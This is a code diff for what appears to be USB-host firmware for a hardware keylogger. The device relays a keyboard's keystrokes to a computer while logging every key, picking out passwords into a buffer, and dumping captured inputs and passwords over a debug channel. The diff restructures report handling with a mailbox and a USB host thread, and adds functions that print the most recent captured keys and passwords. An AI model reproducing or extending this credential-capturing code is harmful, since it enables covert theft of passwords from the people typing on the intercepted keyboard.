@@ -7,7 +7,6 @@
 #include "usb.h"
 #include "usbh.h"
 
-#include "usb_hid_keys.h"
 #include "usbh_custom_class_example.h"
 
 #include "usbh/debug.h"
@@ -17,6 +16,7 @@
 /*
  * defines
  */
+#define MB_SIZE 200
 #define NB_INPUT 200
 #define PASSWORD_MAX_SIZE 20  // must be < NB_INPUT
 
@@ -33,6 +33,10 @@ uint8_t    led_status      = 7;
 uint16_t passwords[PASSWORD_BUFFER_SIZE];
 int      password_index = 0;
 
+mailbox_t umb;
+msg_t     umb_buffer[MB_SIZE];
+MAILBOX_DECL(umb, umb_buffer, MB_SIZE);
+
 /*
  * prototypes
  */
@@ -42,6 +46,7 @@ static void usbh_detector(char input);
  * thread HID
  */
 static THD_WORKING_AREA(waTestHID, 1024);
+static THD_WORKING_AREA(waUsbhMainLoop, 1024);
 static USBH_DEFINE_BUFFER(uint8_t report[HAL_USBHHID_MAX_INSTANCES][8]);
 static USBHHIDConfig hidcfg[HAL_USBHHID_MAX_INSTANCES];
 
@@ -54,35 +59,8 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
     uint8_t *report = (uint8_t *)hidp->config->report_buffer;
 
     if(hidp->type == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
-        /* send the key on the computer */
-        usb_report(&UHD2, report, 8);
-
-        //get every input in a tab
-        uint16_t input = get_input_hid(report);
-        rtt_printf("Key: %c (%04x), input_index = %d", hid2azerty(input), input, input_index);
-        if((uint8_t)input) {
-            inputs[input_index] = input;
-            usbh_detector(hid2azerty(input));
-
-            //input loop
-            input_index++;
-            if(input_index >= NB_INPUT)
-                input_index = 0;
-        }
-
-        if(report[2] == KEY_F6)
-            for(int i = 0; i < input_index; i++)
-                rtt_printf("inputs[%d] = %c (%04x)", i, hid2azerty(passwords[i]), inputs[i]);
-
-        if(report[2] == KEY_F5)
-            for(int i = 0; i < password_index; i++)
-                rtt_printf("passwords[%d] = %c (%04x)", i, hid2azerty(passwords[i]), passwords[i]);
-
-        if(report[2] == KEY_F1 &&
-           report[3] == KEY_F2 &&
-           report[4] == KEY_F3 &&
-           report[5] == KEY_F4)
-            usb_password_terminal(&UHD2);
+        //already in a I-class lock
+        chMBPostI(&umb, (msg_t)report);
     }
 }
 
@@ -123,6 +101,17 @@ static void ThreadTestHID(void *p)
     }
 }
 
+static void ThreadUsbhMainLoop(void *p)
+{
+    (void)p;
+    chRegSetThreadName("USBH");
+
+    for(;;) {
+        usbhMainLoop(&USBHD1);
+        chThdSleepMilliseconds(50);
+    }
+}
+
 /*
  * Initialisation of OTG FS port connected to a keyboard.
  */
@@ -139,6 +128,20 @@ void usbh_init(void)
 
     usbhStart(&USBHD1);
     chThdCreateStatic(waTestHID, sizeof(waTestHID), NORMALPRIO, ThreadTestHID, 0);
+    chThdCreateStatic(waUsbhMainLoop, sizeof(waUsbhMainLoop), NORMALPRIO, ThreadUsbhMainLoop, 0);
+}
+
+void usbh_add_input(uint16_t input)
+{
+    if((uint8_t)input) {
+        inputs[input_index] = input;
+        usbh_detector(hid2azerty(input));
+
+        //input loop
+        input_index++;
+        if(input_index >= NB_INPUT)
+            input_index = 0;
+    }
 }
 
 /* 
@@ -200,4 +203,20 @@ void usbh_detector(char input)
         SEGGER_RTT_Write(0, passwords, password_index);
         rtt_printf("");
     }
+}
+
+void usbh_print_input(void)
+{
+    int nb_input_print = 20;
+    int start          = (input_index - nb_input_print > 0) ? input_index - nb_input_print : 0;
+    for(int i = start; i < input_index; i++)
+        rtt_printf("inputs[%d] = %c (%04x)", i, hid2azerty(inputs[i]), inputs[i]);
+}
+
+void usbh_print_password(void)
+{
+    int nb_password_print = 20;
+    int start             = (password_index - nb_password_print > 0) ? password_index - nb_password_print : 0;
+    for(int i = start; i < password_index; i++)
+        rtt_printf("passwords[%d] = %c (%04x)", i, hid2azerty(passwords[i]), passwords[i]);
 }
